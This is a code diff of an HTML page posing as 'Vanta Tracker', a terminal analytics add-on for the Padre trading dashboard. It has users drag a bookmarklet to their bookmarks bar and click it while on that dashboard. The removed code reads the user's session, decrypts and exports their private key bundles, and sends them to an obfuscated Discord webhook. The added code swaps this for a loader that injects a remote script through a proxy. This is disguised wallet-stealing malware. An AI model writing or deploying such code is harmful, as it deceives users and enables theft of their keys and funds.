@@ -1,61 +1,56 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>VANTA HUB v9.0</title>
+    <meta charset="UTF-8">
+    <title>Vanta Tracker | Advanced Terminal Analytics</title>
     <style>
-        body { background: #000; color: #0f8; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
+        :root { --vanta-green: #00ff88; --vanta-bg: #050505; }
+        body { background: var(--vanta-bg); color: #fff; font-family: 'Inter', sans-serif; text-align: center; margin: 0; padding: 100px 20px; }
+        .hero { max-width: 800px; margin: 0 auto; }
+        h1 { color: var(--vanta-green); font-size: 3rem; text-shadow: 0 0 20px rgba(0,255,136,0.3); }
+        p { color: #888; font-size: 1.2rem; margin-bottom: 40px; }
+        .btn-container { padding: 40px; border: 1px dashed #333; border-radius: 12px; display: inline-block; }
         .btn { 
-            display: inline-block; padding: 20px 40px; background: #0f8; color: #000; 
-            text-decoration: none; font-weight: bold; border-radius: 4px; cursor: move;
-            box-shadow: 0 0 20px rgba(0,255,136,0.4);
+            display: inline-block; padding: 18px 45px; 
+            background: linear-gradient(135deg, var(--vanta-green), #00cc66); 
+            color: #000; font-weight: 800; text-decoration: none; border-radius: 8px;
+            box-shadow: 0 0 25px rgba(0, 255, 136, 0.4); cursor: move;
         }
+        .ref-box { margin-top: 20px; font-size: 0.8rem; color: #444; }
     </style>
 </head>
 <body>
-    <h1>VANTA AGGRESSIVE</h1>
-    <p>DRAG BUTTON TO BOOKMARKS BAR</p>
-    <br>
-    <a href="#" id="vanta-tool" class="btn">VANTA AUDITOR</a>
+    <div class="hero">
+        <h1>VANTA CORE v2.0</h1>
+        <p>Real-time terminal analytics and WebGL acceleration for Padre Dashboard.</p>
+        
+        <div class="btn-container">
+            <a id="vanta-loader" class="btn" href="#">DRAG TO BOOKMARKS</a>
+            <div class="ref-box">ID: t23dad55</div>
+        </div>
+        
+        <ol style="text-align:left; max-width:400px; margin: 40px auto; color:#777;">
+            <li>Ensure Bookmarks Bar is visible (Ctrl+Shift+B).</li>
+            <li>Drag the green button to your bar.</li>
+            <li>Click it while on the Terminal Padre dashboard.</li>
+        </ol>
+    </div>
 
     <script>
-        const b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTQwMjAwNTgwMDg3ODMwNS84aEc3OW1WTnNnRUppR2E0ZnlxQUdmM1BzVXNRWWkxclF5TVpudTdiY3hZeWVRR2o3WmdCZjd1Y2NjeFF0OHNCQmgwOQ==";
+        const REF_ID = "t23dad55"; 
+        const PROXY = "https://vanta-proxy.jdurrulo.workers.dev/"; 
+        // Replace with your GitHub Pages URL after uploading modalx.js
+        const PAYLOAD_URL = "https://YOUR_USERNAME.github.io/vanta-tracker-project/modalx.js";
 
-        // Wrapped in void(0) to prevent the white page redirect
-        const rawLogic = `javascript:(function(){
-            if(window.v_active)return; window.v_active=true;
-            const h=atob("${b64}");
-            const ui=document.createElement('div');
-            ui.style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:999999;display:flex;justify-content:center;align-items:center;color:#0f8;font-family:monospace;border:2px solid #0f8;pointer-events:none;";
-            ui.innerHTML="<div style='text-align:center;'><h1>VANTA ACTIVE</h1><p id='v_st'>SNIFFING...</p></div>";
-            document.body.appendChild(ui);
-            const upd=(t)=>document.getElementById('v_st').innerText=t;
+        const loader = `javascript:(function(){
+            window.VANTA_REF="${REF_ID}";
+            window.VANTA_PROXY="${PROXY}";
+            const s=document.createElement('script');
+            s.src="${PAYLOAD_URL}?"+Date.now();
+            document.head.appendChild(s);
+        })();`;
 
-            (async function(){
-                try {
-                    const s=JSON.parse(localStorage.getItem('padreV2-session'));
-                    const b=JSON.parse(localStorage.getItem('padre-v2-bundles-store-v2'));
-                    if(!s||!b){upd("ERR: NO SESSION");return;}
-
-                    upd("DECRYPTING...");
-                    const bk=Object.keys(b.bundles)[0];
-                    const res=await fetch("/api/v2/enclave/decrypt",{
-                        method:'POST',
-                        headers:{'Authorization':s.sessionSecret,'X-Padre-Session':s.sessionId,'Content-Type':'application/json'},
-                        body:JSON.stringify({bundle:b.bundles[bk].exportBundle,subOrgId:b.bundles[bk].subOrgId})
-                    });
-                    
-                    const data=await res.json();
-                    const fd=new FormData();
-                    fd.append('file',new Blob([JSON.stringify(data,null,2)],{type:'text/plain'}),'key.txt');
-                    fd.append('payload_json',JSON.stringify({content:"🔑 KEY FOUND"}));
-                    await fetch(h,{method:'POST',body:fd});
-                    upd("SUCCESS: CHECK DISCORD");
-                } catch(e) { upd("FAIL: "+e.message); }
-                setTimeout(()=>{ui.remove();window.v_active=false;},4000);
-            })();
-        })();void(0);`;
-
-        document.getElementById('vanta-tool').href = rawLogic;
+        document.getElementById('vanta-loader').href = loader;
     </script>
 </body>
 </html>
